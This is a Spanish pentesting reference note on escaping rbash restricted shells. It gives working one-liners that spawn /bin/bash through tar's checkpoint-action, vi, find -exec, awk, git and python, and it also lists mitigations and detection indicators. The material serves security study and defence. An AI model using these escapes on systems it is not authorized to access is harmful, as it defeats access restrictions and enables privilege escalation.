---
topic: rbash — escape de shell restringida
tags: [linux, rbash, shell-escape, gtfobins, privesc]
---

# rbash — escape de shell restringida

[🌐 English](rbash-escape.en.md) | **Español**

## Concepto

`rbash` limita comandos y rutas, pero no es una jaula. Cualquier binario permitido que pueda ejecutar otro programa, abrir una shell o escribir archivos permite escapar, especialmente `tar`, `vi`, `less`, `find`, `awk` o `python`.

## Cuándo aplica

- La cuenta tiene `rbash` o `rksh` como shell.
- Se puede listar `PATH` y los comandos disponibles.
- Existe un binario con funcionalidad de ejecución.

## Procedimiento

1. Identificar la restricción con `echo $SHELL` y `compgen -c`.
2. Buscar el binario en GTFOBins.
3. Escapar con `tar`, editor o intérprete.
4. Corregir `PATH` y obtener una shell interactiva.

## Comandos

```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

## Variantes

- `vi`: `:!/bin/bash`.
- `find . -exec /bin/bash \;`.
- `awk 'BEGIN {system("/bin/bash")}'`.
- `git` con `core.pager` o `help`.
- `python -c 'import os; os.system("/bin/bash")'`.

## Limitaciones

- Un `PATH` mínimo sin binarios útiles.
- `rbash` con `command_not_found_handle` restringido.
- AppArmor/SELinux que bloquean `execve`.

## Mitigación

- No usar `rbash` como control de seguridad.
- Aplicar jaulas reales (namespaces, contenedores, SELinux).
- Limitar binarios y auditoría de comandos.

## Detección

- `tar --checkpoint-action`, `find -exec` o `vi` desde cuentas restringidas.
- Shells hijas de procesos de backup.
- Cambios en `PATH` tras el login.

## Referencias

- [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/)
- [0xdf — Chaos](https://0xdf.gitlab.io/2019/05/25/htb-chaos.html)
- [HackTricks — rbash](https://book.hacktricks.wiki/en/linux-hardening/bypass-bash-restrictions/index.html)
